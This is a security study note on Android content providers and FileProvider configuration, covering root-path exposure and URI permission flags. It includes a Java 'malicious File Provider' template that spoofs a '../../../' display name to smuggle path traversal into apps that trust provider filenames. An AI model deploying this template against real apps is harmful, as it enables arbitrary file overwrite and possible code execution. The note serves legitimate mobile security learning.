## Content Providers
[Content providers](https://developer.android.com/guide/topics/providers/content-providers) are components used to **store, manage and share data between multiple applications**. An example is WhatsApp accessing address book data. Due to the isolation between apps, in theory this would not be possible. However, the content provider in question allows one app to access the data of the other, thus allowing them to communicate and exchange data.

![|650](../../zzz_res/attachments/content-providers.png)

A content provider is only required if you need to share data between multiple applications. For example, the contacts data is used by multiple applications and must be stored in a content provider. If you don't need to share data amongst multiple applications you can use a database directly via [SQLiteDatabase](https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase).

When a request is made via a [ContentResolver](https://developer.android.com/reference/android/content/ContentResolver) the system inspects the authority of the given URI and passes the request to the content provider registered with the authority. The content provider can interpret the rest of the URI however it wants. The [UriMatcher](https://developer.android.com/reference/android/content/UriMatcher) class is helpful for parsing URIs.

The primary methods that need to be implemented are:

- [`onCreate()`](https://developer.android.com/reference/android/content/ContentProvider#onCreate()) which is called to initialize the provider
- [`query(Uri, String, Bundle, CancellationSignal)`](https://developer.android.com/reference/android/content/ContentProvider#query(android.net.Uri,%20java.lang.String[],%20android.os.Bundle,%20android.os.CancellationSignal)) which returns data to the caller
- [`insert(Uri, ContentValues)`](https://developer.android.com/reference/android/content/ContentProvider#insert(android.net.Uri,%20android.content.ContentValues)) which inserts new data into the content provider
- [`update(Uri, ContentValues, Bundle)`](https://developer.android.com/reference/android/content/ContentProvider#update(android.net.Uri,%20android.content.ContentValues,%20android.os.Bundle)) which updates existing data in the content provider
- [`delete(Uri, Bundle)`](https://developer.android.com/reference/android/content/ContentProvider#delete(android.net.Uri,%20android.os.Bundle)) which deletes data from the content provider
- [`getType(Uri)`](https://developer.android.com/reference/android/content/ContentProvider#getType(android.net.Uri)) which returns the MIME type of data in the content provider
- `openFile()`

### FileProvider

[Android Jetpack](https://developer.android.com/jetpack) (or androidx) is a commonly used official library implementing lots of useful classes. Including the widely used [`FileProvider`](https://developer.android.com/reference/androidx/core/content/package-summary). Such a provider can easily be identified in the Android manifest where it references the `androidx.core.content.FileProvider` name.

```xml
<provider android:name="androidx.core.content.FileProvider"
          android:exported="false" 
          android:authorities="io.hextree.files"
          android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" 
               android:resource="@xml/filepaths"/>
</provider>
```

Notable is the referenced XML file `filepaths.xml` which contains the configuration for this FileProvider.

```xml title:filepaths.xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="flag_files" path="flags/"/>
    <files-path name="other_files" path="."/>
</paths>
```

A typical URI generated for this FileProvider could look like this `content://io.hextree.files/other_files/secret.txt`. Where the sections can be read like so:

- `content://` it's a content provider
- `io.hextree.files` the authority from the android manifest
- `other_files` which configuration entry is used
- `/secret.txt` the path of the file relative to the configured `path` in the .xml file

#### root_files

Compare the `filepaths.xml` to the `rootpaths.xml` file provider configuration. Why is the `<root-path>` considered "insecure"?

```xml title:filepaths.xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <files-path name="flag_files" path="flags/"/>
    <files-path name="other_files" path="."/>
</paths>
```

Remember that the file provider configuration is used to generate file sharing URIs such as `content://io.hextree.files/other_files/secret.txt`. These sections can be read like so:

- `content://` it's a content provider
- `io.hextree.files` the authority from the android manifest
- `other_files` which configuration entry is used
- `/secret.txt` the path of the file relative to the configured `path` in the .xml file


```xml title:rootpaths.xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <root-path name="root_files" path="/"/>
</paths>
```

The file provider with a `<root-path>` configuration will generated URIs like this `content://io.hextree.files/root_files/data/data/io.hextree.attacksurface/files/secret.txt`. If we decode these sections we can see that this provider can map files of the entire filesystem

- `content://` it's a content provider
- `io.hextree.root` the authority from the android manifest
- `root_files` which configuration entry is used
- `/data/data/io.hextree.attacksurface/files/secret.txt` the path of the file relative to the configured `path`, which is mapped to the filesystem root!

In itself the `<root-path>` configuration is not actually insecure, as long as only trusted files are shared. But if the app allows an attacker to control the path to any file, it can be used to expose arbitrary internal files.

#### read or write permissions

Note that in decompiled code the integer constants `FLAG_GRANT_READ_URI_PERMISSION` are probably directly referenced. Which means:

- `addFlags(1)` = `FLAG_GRANT_READ_URI_PERMISSION`
- `addFlags(2)` = `FLAG_GRANT_WRITE_URI_PERMISSION`
- `addFlags(3)` = both `FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION`

If you have write permissions and you find a misconfigured file provider, you may be able to overwrite sensitive files or libraries, eventually finding [Remote Code Execution (RCE)](../Web%20&%20Network%20Hacking/Remote%20Code%20Execution%20(RCE).md) vulnerabilities.

## Snippets and PoC templates

### Malicious File Provider

You can use the following code snippet to implement a malicious File Provider that can spoof the filename.

```java
public class AttackProvider extends ContentProvider {
    public AttackProvider() {
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection,
                        String[] selectionArgs, String sortOrder) {
        Log.i("AttackProvider", "query("+uri.toString()+")");

        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });

        cursor.addRow(new Object[]{
                "../../../filename.txt", 12345
        });

        return cursor;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
        Log.i("AttackProvider", "openFile(" + uri.toString() + ")");

        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    outputStream.write("<h1>File Content</h1>".getBytes());
                    outputStream.close();
                } catch (IOException e) {
                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
        }
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i("AttackProvider", "delete("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public String getType(Uri uri) {
        Log.i("AttackProvider", "getType("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i("AttackProvider", "insert("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public boolean onCreate() {
        Log.i("AttackProvider", "onCreate()");
        return true;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection,
                      String[] selectionArgs) {
        Log.i("AttackProvider", "update("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
```

## Example vulnerabilities
- Arbitrary file read/write using exported [Content Providers](Content%20Providers.md) [^file-read-content-provider-vault][^file-read-content-provider-element]
- Arbitrary file read/write from non-exported content providers that have the `grantUriPermission` enabled. The provider is generally not exported with `android:exported="false"` but the attribute `android:grantUriPermissions="true"` is set. This means the provider cannot be directly interacted with. But the app can allow another app to query the provider, when sending an [Intent](Intent.md) with a flag such as [`GRANT_READ_URI_PERMISSION`](https://developer.android.com/reference/android/content/Intent#FLAG_GRANT_READ_URI_PERMISSION). ^b4a712
- [SQL Injection](../Web%20&%20Network%20Hacking/SQL%20Injection.md) in [Content Providers](Content%20Providers.md)


[^file-read-content-provider-vault]: [Arbitrary file interaction using an exported content provider](https://0xbro.red/disclosures/disclosed-vulnerabilities/digital-private-vault/#arbitrary-file-interaction-using-an-exported-content-provider), 0xbro.red
[^file-read-content-provider-element]: [Element Android (<1.6.12) Sensitive file disclosure via share activity](https://www.shielder.com/advisories/element-android-sensitive-file-disclosure/), shielder.com